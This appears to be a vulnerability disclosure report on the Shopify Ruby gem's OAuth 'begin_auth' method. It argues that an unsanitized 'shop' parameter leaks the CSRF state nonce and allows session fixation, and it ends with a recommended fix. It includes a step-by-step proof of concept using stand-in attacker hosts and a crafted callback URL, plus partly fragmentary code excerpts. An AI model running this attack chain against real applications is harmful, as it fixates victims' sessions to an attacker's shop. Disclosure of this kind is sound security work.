### Title
Unvalidated `shop` Parameter in OAuth `begin_auth` Enables Session Fixation via Forced Redirect — (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` builds the OAuth authorization URL by concatenating the caller-supplied `shop` value directly into a URI (`auth_base_uri(shop)`), with no validation that `shop` is a trusted Shopify domain. Every other credential-issuing entry point in this gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) explicitly calls `Utils::ShopValidator.sanitize!(shop)` before using it, but `begin_auth` does not. This breaks the identity binding that the redirect target ("host that receives the CSRF `state` nonce") should equal a Shopify host.

### Finding Description
`begin_auth` generates a CSRF `state` nonce, stores it in a `SessionCookie`, and also embeds it as a query parameter in a URL whose host is derived unsanitized from `shop`: [1](#0-0) 

`auth_base_uri` performs no domain allow-listing of `shop` (unlike `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`): [2](#0-1) 

Compare this to the three other credential-flow entry points, all of which call `Utils::ShopValidator.sanitize!(shop)` before constructing any request: [3](#0-2) [4](#0-3) 

The host application's documented pattern reads `shop` straight from an inbound, unauthenticated request parameter and passes it directly into `begin_auth`: [5](#0-4) 

Because `auth_base_uri(shop)` is not restricted to `myshopify.com`/trusted domains, an attacker can supply `shop=attacker-controlled-host` to make the gem redirect the victim's browser to `https://attacker-controlled-host/admin/oauth/authorize?client_id=...&redirect_uri=<real_app_callback>&state=<nonce>` — sending the CSRF `state` nonce (the value later checked against the cookie in `validate_auth_callback`) directly to the attacker's server as a URL query parameter. The equality this breaks is: *host that receives the CSRF state nonce* == *trusted Shopify domain*. Once broken, the attacker's server learns the nonce, completes a genuine OAuth authorization for their own shop with the real Shopify (obtaining a valid `code`+`hmac`+`state`), and replays that callback to the victim's browser at the real app callback URL. `validate_auth_callback` will accept it because the HMAC is valid (signed by Shopify for the attacker's own shop) and `state == cookie` matches (the attacker captured the same nonce): [6](#0-5) 

The victim's browser ends up with a valid app session cookie bound to the attacker's shop instead of their intended one — a session-fixation / forced-OAuth-completion primitive.

### Impact Explanation
This is a High-severity issue per the "session fixation or forced OAuth completion" category: an unprivileged internet user, without any credentials, can force a victim's browser into completing OAuth against an attacker-chosen shop, fixating the victim's app session to the attacker's tenant. Depending on how the host app uses the resulting session, this can lead to data leakage into the attacker's shop or later account/session confusion.

### Likelihood Explanation
Exploitation requires only that the host application pass an externally-supplied `shop` value into `begin_auth` without its own validation — which is exactly the pattern shown in this gem's own documentation example (`shop = request.headers["Shop"]`). No secrets, tokens, or privileged access are required by the attacker.

### Recommendation
Validate and sanitize `shop` in `begin_auth` the same way it is done in `ClientCredentials`, `RefreshToken`, and `TokenExchange`: call `Utils::ShopValidator.sanitize!(shop)` (or equivalent) before using it to build `auth_base_uri`, ensuring the authorize request — and therefore the CSRF `state` nonce — can only ever be sent to a trusted Shopify domain.

### Proof of Concept
1. Host app exposes `/login?shop=<param>` which calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: params[:shop], redirect_path: "/auth/callback")` (as shown in `docs/usage/oauth.md`).
2. Attacker sends victim a link: `https://victim-app.example.com/login?shop=attacker.example.com`.
3. `begin_auth` sets a `state` cookie on the victim's browser and returns `auth_route = "https://attacker.example.com/admin/oauth/authorize?client_id=...&redirect_uri=https://victim-app.example.com/auth/callback&state=<nonce>"`.
4. Victim's browser is redirected to `attacker.example.com`, leaking `state=<nonce>` to the attacker's server via the query string.
5. Attacker independently performs a real OAuth authorization for their own Shopify store, obtaining a genuine `code`/`hmac` pair from Shopify, and constructs a callback URL: `https://victim-app.example.com/auth/callback?code=<real_code>&shop=<attacker-shop>.myshopify.com&state=<captured_nonce>&hmac=<real_hmac>&timestamp=...`.
6. Attacker causes the victim's browser to visit this URL (e.g. via redirect/img/iframe). `validate_auth_callback` passes HMAC validation (genuine Shopify signature) and state validation (nonce matches the cookie set in step 3), producing a session bound to the attacker's shop in the victim's browser context.

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          raise Errors::InvalidOauthError,

        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end

class ShopifyAuthController < ApplicationController
  def login
    shop = request.headers["Shop"]

    # Builds the authorization URL route to redirect the user to
    auth_response = ShopifyAPI::Auth::Oauth.begin_auth(shop: domain, redirect_path: "/auth/callback")

    # Store the authorization cookie
    cookies[auth_response[:cookie].name] = {
      expires: auth_response[:cookie].expires,
      secure: true,
      http_only: true,
      value: auth_response[:cookie].value
    }

    # Redirect the user to "auth_response[:auth_route]" to allow user to grant the app permission
    # This will lead the user to the Shopify Authorization page
    head 307
    response.set_header("Location", auth_response[:auth_route])
  end
